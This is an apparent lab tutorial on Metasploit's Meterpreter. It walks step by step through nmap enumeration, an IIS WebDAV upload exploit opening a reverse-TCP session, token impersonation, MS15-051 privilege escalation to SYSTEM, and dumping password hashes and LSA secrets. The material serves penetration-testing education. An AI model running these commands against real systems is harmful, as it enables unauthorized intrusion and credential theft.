
# Meterpreter — Metasploit Framework

## 1. What Is Meterpreter?

**Meterpreter** is an extensible Metasploit payload designed for **post-exploitation**. Once a compatible payload executes on a target, it provides an interactive session with capabilities beyond a conventional command shell.

Its main design goals are:

- **Stealth:** Reduce obvious artifacts and support in-memory execution.
- **Power:** Provide commands for interacting with processes, the file system, and host information.
- **Extensibility:** Load extra features and modules when needed.

On the Windows example in this lesson, a staged payload uses reflective DLL loading and an encrypted communication channel. Meterpreter can run in memory, but **the overall exploitation process is not necessarily fileless or undetectable**.

## 2. How a Staged Meterpreter Session Starts

The lesson describes the following sequence:

1. A target executes an initial **stager** (e.g., a reverse TCP stager).
2. The stager loads the Meterpreter stage using a reflective DLL-loading mechanism.
3. Meterpreter initializes an **AES-encrypted** communication channel.
4. The framework and Meterpreter finish setting up their communication.
5. Extensions such as `stdapi` become available; additional functionality depends on the session and permissions.

**Stager vs. stage:** The stager is the small initial component; the stage contains the larger Meterpreter functionality. A **stageless** payload packages functionality differently, rather than fetching a separate stage.

## 3. Useful Meterpreter Commands

| Command | Purpose |
|---|---|
| `help` or `?` | Display Meterpreter help |
| `background` or `bg` | Return to `msfconsole` without intentionally closing the session |
| `exit` or `quit` | Terminate the current Meterpreter session |
| `getuid` | Display the effective identity of the session |
| `ps` | List running processes |
| `migrate <PID>` | Attempt to move Meterpreter execution to another process |
| `steal_token <PID>` | Attempt to impersonate a process's Windows access token |
| `load <extension>` | Load additional Meterpreter functionality |
| `sessions` | Switch between sessions |
| `channel` | View or manage Meterpreter channels |
| `transport` | Manage the session's communication transport |
| `run` | Execute a compatible Meterpreter script or post module |

**Important:** `migrate` and `steal_token` do **not** mean the same thing. Migration changes the process hosting Meterpreter; token impersonation changes the security identity under which certain operations are attempted. Both are subject to permissions and compatibility.

## 4. Enumerating the Target with Metasploit

The lab begins by identifying services on the target:

```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
```

| Option | Meaning |
|---|---|
| `db_nmap` | Run Nmap through Metasploit and import results into its database |
| `-sV` | Attempt service/version detection |
| `-p-` | Scan all 65,535 TCP ports |
| `-T5` | Use the most aggressive preset timing profile |
| `-A` | Enable additional detection/enumeration features |

The lesson's scan finds **TCP port 80** open, serving **Microsoft IIS 6.0** with WebDAV-related methods.

Review collected data:

```bash
hosts
services
```

**Why it matters:** We use service identification to choose the next investigation step instead of selecting exploits blindly. The aggressive `-T5` setting is from the lesson, not a universal recommendation.

## 5. Initial Exploitation: IIS WebDAV

The lesson searches for a Metasploit module:

```bash
search iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
show options
```

It then configures the lab target and the interface used for reverse connections:

```bash
set RHOSTS 10.10.10.15
set LHOST tun0
run
```

Key settings:

- `RHOSTS`: Target address or addresses.
- `RPORT`: Target service port (80 in the example).
- `LHOST`: Local listener address/interface reachable by the target.
- `LPORT`: Local listener port (4444 in the example).
- `PAYLOAD`: Here, `windows/meterpreter/reverse_tcp`.

The module uploads content, renames an uploaded `.txt` file to `.asp`, and invokes it. The output eventually shows:

```text
[*] Meterpreter session 1 opened (...)
meterpreter >
```

**Artifact warning:** The exploit attempts to delete its `.asp` file, but the lesson shows `403 Forbidden`. A file is left on disk even though the resulting Meterpreter stage is memory-resident. This can provide valuable forensic evidence.

**Source nuance:** The text also mentions `CVE-2017-7269`, while the demonstration selects the separate `iis_webdav_upload_asp` module. We should **not assume** that the module invocation demonstrates that CVE without checking the module's own description.

## 6. Checking Identity and Windows Processes

The lesson runs:

```bash
getuid
ps
```

Initially, `getuid` returns `Access is denied`. The process listing includes a process running as `NT AUTHORITY\NETWORK SERVICE`.

The demonstrated token operation is:

```bash
steal_token 1836
getuid
```

The follow-up `getuid` reports:

```text
NT AUTHORITY\NETWORK SERVICE
```

**Interpretation:** This is an example of **token impersonation**, not process migration and not yet SYSTEM-level access. `NETWORK SERVICE` is a restricted Windows service identity.

When attempting to access `C:\Inetpub\AdminScripts`, the lesson gets `Access is denied`, illustrating that an established session does not automatically grant permission to access every resource.

## 7. Looking for Local Privilege-Escalation Opportunities

The existing Meterpreter session is sent to the background:

```bash
bg
```

From `msfconsole`, the lesson chooses a post-exploitation reconnaissance module:

```bash
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
show options
set SESSION 1
run
```

The module checks for potentially applicable local exploits using the existing session. The lesson reports multiple candidates, including:

- `ms14_058_track_popup_menu`
- `ms14_070_tcpip_ioctl`
- `ms15_051_client_copy_image`

**Important:** "The target appears to be vulnerable" indicates a candidate, **not** a guaranteed successful exploit.

## 8. Obtaining a Higher-Privilege Session

The lesson then uses the Windows local exploit associated with MS15-051:

```bash
use exploit/windows/local/ms15_051_client_copy_image
show options
set SESSION 1
set LHOST tun0
run
```

In the demonstrated lab, the exploit opens **Meterpreter session 2**, and:

```bash
getuid
```

returns:

```text
Server username: NT AUTHORITY\SYSTEM
```

**Interpretation:** The lab has escalated from a service identity to **SYSTEM**, one of the highest local Windows security contexts. The new session (2) is distinct from the original session (1).

Note: One line in the source uses the plural module spelling `ms15_051_client_copy_images`, while its prompt and earlier results use the singular `ms15_051_client_copy_image`. We follow the singular form shown in the module context.

## 9. Credential Material Demonstrated in the Lab

Once running as SYSTEM, the lesson shows commands that retrieve sensitive local authentication material:

```bash
hashdump
lsa_dump_sam
lsa_dump_secrets
```

| Command | What it illustrates |
|---|---|
| `hashdump` | Displays local account password hashes in a compact record format |
| `lsa_dump_sam` | Displays SAM account details and hashes |
| `lsa_dump_secrets` | Displays LSA secrets, which may contain service-related credentials, keys, or other sensitive values |

Example `hashdump` record structure:

```text
username:RID:LM_hash:NTLM_hash:::
```

- **RID:** Relative identifier of the account.
- **LM/NTLM hashes:** Password-derived authentication values, **not plaintext passwords**.
- **SAM:** Security Account Manager, which stores local account information.
- **LSA:** Local Security Authority; related secret storage can contain sensitive service/system data.

We should treat such output as confidential evidence and only collect or handle it within explicitly authorized lab or assessment scope.

## 10. End-to-End Lab Flow

```text
Service discovery
  -> IIS 6.0 / WebDAV investigation
  -> Initial exploit
  -> Meterpreter session 1
  -> Check identity and processes
  -> Impersonate NETWORK SERVICE token
  -> Background session 1
  -> Local Exploit Suggester (SESSION 1)
  -> Local privilege-escalation exploit
  -> Meterpreter session 2 as SYSTEM
  -> Inspect sensitive local account/LSA information
```

## 11. Key Takeaways

1. Meterpreter is a **post-exploitation payload**, not a standalone vulnerability.
2. A staged Meterpreter payload separates the initial **stager** from the larger **stage**.
3. We can use Metasploit's database integration (`db_nmap`, `hosts`, `services`) during enumeration.
4. A successful Meterpreter session does **not** automatically mean administrative privileges.
5. **Process migration** and **token impersonation** are distinct operations.
6. `local_exploit_suggester` provides candidates, not proof of exploitability.
7. `SESSION 1` can be reused by compatible post-exploitation modules.
8. A successful local escalation can create a **new** session with higher privileges.
9. Memory-resident payloads can still leave artifacts from other exploitation steps.
10. Credential-related outputs are sensitive and must be handled within the scope of authorized testing.
